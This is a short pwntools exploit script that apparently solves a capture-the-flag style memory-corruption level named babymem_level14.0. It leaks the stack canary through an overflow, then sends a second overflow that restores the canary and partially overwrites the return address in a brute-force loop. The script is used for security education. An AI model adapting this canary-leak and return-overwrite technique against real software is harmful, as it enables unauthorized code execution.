from pwn import *

while True:
    # Init
    elf = ELF("/challenge/babymem_level14.0")
    context.arch = "amd64"
    context.endian = "little"

    # Vars
    distance_canary = 16 #0x10
    buffer_length = 328 #local_148
    distance_between_buffer_and_canary = buffer_length - distance_canary

    io = elf.process()

    # Leak the canary
    io.recvuntil("size:")
    io.sendline(f'{41}')
    io.recvuntil("bytes)!")
    
    payload_first_run = b'A'*(34) + b'REPEATZ'
    io.sendline(payload_first_run)
    
    io.recvuntil(b'REPEATZ')
    canary = b'\x00' + io.recvline().strip()[:7]
    print(len(canary))
    print(canary)

    # Second run
    io.recvuntil("size:")
    io.sendline(f'{buffer_length + 2}')
    
    payload = b"A"*(distance_between_buffer_and_canary) + canary + b'A'*8 + b'\x76\x20'
    io.recvuntil("bytes)!")
    io.send(payload)
    io.interactive()